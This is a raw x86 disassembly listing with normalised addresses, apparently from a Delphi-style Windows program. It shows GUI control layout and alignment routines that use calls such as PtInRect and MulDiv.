mov edx esp
mov eax edi
call sub_446ac8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_40358c
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_40358c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_446af4
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_41a068
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_419ff0
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_446a9c
sub_449424
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_449464
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445cc8
mov eax esi
mov edx [ r-xdata ]
call sub_403540
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_449498
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_449590
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_446084
push ebx
push sub_44af28
call sub_424b38
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427460
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_427608
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464a20
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_404174
lea eax [ ebx + 0x188 ]
call sub_404120
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449597
lea eax [ ebp - 0x8 ]
call sub_404120
retn
sub_449597
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4495bc
push ebx
push esi
push edi
call sub_40375c
mov ebx edx
mov edi eax
mov eax edi
call sub_423d48
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405b50
mov eax [ edi + 0x178 ]
call sub_403390
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_444c30
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_44a25c
mov eax edi
call sub_44a49c
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403390
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_44a460
mov esi eax
mov edx esi
mov eax edi
call sub_44a2c8
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_44a49c
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_44615c
test bl bl
jle r-xdata
call sub_424bd0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403744
sub_44968c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_449750
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41b84c
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403390
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_44d964
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41b654
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41b7a0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41b654
test eax eax
je r-xdata
sub_449760
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44a004
xor eax eax
push ebp
push sub_4497a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4463c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4497a7
mov eax [ ebp - 0x4 ]
call sub_44a00c
retn
sub_4497a7
mov eax [ ebp - 0x4 ]
call sub_44968c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44ae60
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_448138
sub_4497dc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_4497f7 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_449868
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44daa8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_419ff0
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_449be9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449bf0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_449afe ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_449a61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_449bf0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_449c1f ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_449ca8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44a49c
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41b4f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_41b654
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_449868
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_44a460
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41b6d0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_41b654
mov edx eax
mov ecx ebx
mov eax edi
call sub_4497dc
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_449e18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_44a49c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_44a460
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_44a460
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_449e6c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_449e18
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_449f4b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_449ca8
pop ecx
push ebp
mov al 0x2
call sub_449ca8
pop ecx
push ebp
mov al 0x3
call sub_449ca8
pop ecx
push ebp
mov al 0x4
call sub_449ca8
pop ecx
push ebp
mov al 0x5
call sub_449ca8
pop ecx
push ebp
mov al 0x6
call sub_449ca8
pop ecx
push ebp
xor eax eax
call sub_449ca8
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403390
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_40358c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_449f70
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a004
xor eax eax
push ebp
push sub_449ff7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44a00c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_44a034
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44a0f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_446988
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_44a49c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a100
mov eax [ ebp - 0xc ]
call sub_403390
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a460
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41b4f8
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4466f4
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41b654
xor ecx ecx
mov edx 0xb03e
call sub_448138
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a460
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_44a108
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44a49c
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44a004
xor edx edx
push ebp
push sub_44a1ef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44a49c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a460
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41b4f8
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_41b654
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403390
mov eax [ ebp - 0x4 ]
call sub_44a00c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a460
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_446498
mov dl 0x4
call sub_446498
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_41b544
sub_44a25c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45dd9c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_461ac0
sub_44a27c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_445878
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_445878
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_445878
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_44a2c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4458a0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4458a0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4458a0
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44a310
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40358c
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_448138
mov edx ebx
mov eax edi
call sub_44a27c
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_448138
pop edi
pop esi
pop ebx
retn
push 0x0
